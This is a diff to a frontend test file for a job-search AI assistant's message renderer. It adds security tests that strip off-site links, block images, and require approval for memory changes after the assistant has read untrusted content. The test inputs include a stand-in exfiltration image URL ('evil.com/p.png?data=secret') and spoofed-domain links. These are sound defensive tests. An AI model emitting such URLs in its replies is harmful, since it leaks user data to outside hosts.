@@ -2,7 +2,7 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 import { render, screen } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import type { UIMessage } from "ai";
-import MessageParts from "./MessageParts";
+import MessageParts, { isInAppHref } from "./MessageParts";
 
 vi.mock("@/app/actions/upload-resume-file", () => ({ uploadResumeAction: vi.fn() }));
 
@@ -25,7 +25,7 @@ describe("MessageParts", () => {
   it("opens every link in a new tab", () => {
     renderParts(
       assistant([
-        { type: "text", text: "See [your dashboard](/dashboard) or [Stripe](https://stripe.com)." },
+        { type: "text", text: "See [your dashboard](/dashboard) or [jobs](https://gethired.devhub.co.in/jobs)." },
         {
           type: "tool-searchJobs",
           toolCallId: "c1",
@@ -49,6 +49,89 @@ describe("MessageParts", () => {
       expect(link).toHaveAttribute("target", "_blank");
       expect(link).toHaveAttribute("rel", "noopener noreferrer");
     }
+  });
+
+  describe("links and images in replies (SEC-014)", () => {
+    it.each([
+      ["/jobs/j1", true],
+      ["/dashboard/buy-credits?x=1", true],
+      ["https://gethired.devhub.co.in/jobs/j1", true],
+      ["https://evil.com/login", false],
+      ["http://gethired.devhub.co.in/jobs", false],
+      ["https://gethired.devhub.co.in.evil.com/", false],
+      ["//evil.com", false],
+      ["/\\evil.com", false],
+      ["mailto:a@b.com", false],
+      ["#section", false],
+      [undefined, false],
+    ])("isInAppHref(%s) is %s", (href, expected) => {
+      expect(isInAppHref(href)).toBe(expected);
+    });
+
+    it("shows links outside the app as plain text", () => {
+      renderParts(
+        assistant([
+          { type: "text", text: "Apply at [this page](https://evil.com/login) or [here](//evil.com)." },
+        ]),
+      );
+
+      expect(screen.queryByRole("link")).not.toBeInTheDocument();
+      expect(screen.getByText("this page")).toBeInTheDocument();
+      expect(screen.getByText("here")).toBeInTheDocument();
+    });
+
+    it("never loads images, showing their alt text instead", () => {
+      const { container } = render(
+        <MessageParts
+          message={assistant([
+            { type: "text", text: "![company logo](https://evil.com/p.png?data=secret)" },
+          ])}
+          onApprove={vi.fn()}
+          onToolOutput={vi.fn()}
+        />,
+      );
+
+      expect(container.querySelector("img")).toBeNull();
+      expect(screen.getByText("company logo")).toBeInTheDocument();
+    });
+  });
+
+  describe("streaming replies", () => {
+    const props = { onApprove: vi.fn(), onToolOutput: vi.fn() };
+
+    it("fades in words while the reply streams", () => {
+      const { container } = render(
+        <MessageParts message={assistant([{ type: "text", text: "Found **two** jobs" }])} streaming {...props} />,
+      );
+
+      const words = [...container.querySelectorAll(".agent-word")].map((el) => el.textContent);
+      expect(words).toEqual(["Found", "two", "jobs"]);
+      expect(screen.getByText("two").closest("strong")).not.toBeNull();
+    });
+
+    it("doesn't animate words that were already shown when more arrive", () => {
+      const { container, rerender } = render(
+        <MessageParts message={assistant([{ type: "text", text: "Found two" }])} streaming {...props} />,
+      );
+      const first = container.querySelector(".agent-word");
+
+      rerender(
+        <MessageParts message={assistant([{ type: "text", text: "Found two jobs for you" }])} streaming {...props} />,
+      );
+
+      // Same DOM node: it isn't remounted, so its animation doesn't replay.
+      expect(container.querySelector(".agent-word")).toBe(first);
+      expect(container.querySelectorAll(".agent-word")).toHaveLength(5);
+    });
+
+    it("renders finished replies without animation", () => {
+      const { container } = render(
+        <MessageParts message={assistant([{ type: "text", text: "Found two jobs" }])} {...props} />,
+      );
+
+      expect(container.querySelector(".agent-word")).toBeNull();
+      expect(screen.getByText("Found two jobs")).toBeInTheDocument();
+    });
   });
 
   it("renders user text as plain text", () => {
@@ -348,6 +431,42 @@ describe("MessageParts", () => {
 
     expect(screen.getByText("Saved the job")).toBeInTheDocument();
     expect(screen.getByText("Declined: update your job preferences")).toBeInTheDocument();
+  });
+
+  it("shows an action the app skipped, with its reason and no approval buttons (SEC-013)", () => {
+    renderParts(
+      assistant([
+        {
+          type: "tool-naturalLanguageJobSearch",
+          toolCallId: "c1",
+          state: "output-denied",
+          input: { query: "react" },
+          approval: { id: "a", isAutomatic: true, approved: false, reason: "Only 2 credit-spending actions can run per message." },
+        },
+      ]),
+    );
+
+    expect(screen.getByText("Skipped: search jobs")).toBeInTheDocument();
+    expect(screen.getByText("Only 2 credit-spending actions can run per message.")).toBeInTheDocument();
+    expect(screen.queryByRole("button")).not.toBeInTheDocument();
+  });
+
+  it("explains why a memory change needs approval (SEC-012)", () => {
+    renderParts(
+      assistant([
+        {
+          type: "tool-saveMemory",
+          toolCallId: "c1",
+          state: "approval-requested",
+          input: { category: "preference", content: "Prefers Acme" },
+          approval: { id: "a", requestReason: "The assistant read a job posting or report in this reply, so memory changes need your OK." },
+        },
+      ]),
+    );
+
+    expect(screen.getByText("Allow the assistant to save a memory?")).toBeInTheDocument();
+    expect(screen.getByText(/memory changes need your OK/)).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Approve" })).toBeInTheDocument();
   });
 
   it("links to a started resume review", () => {
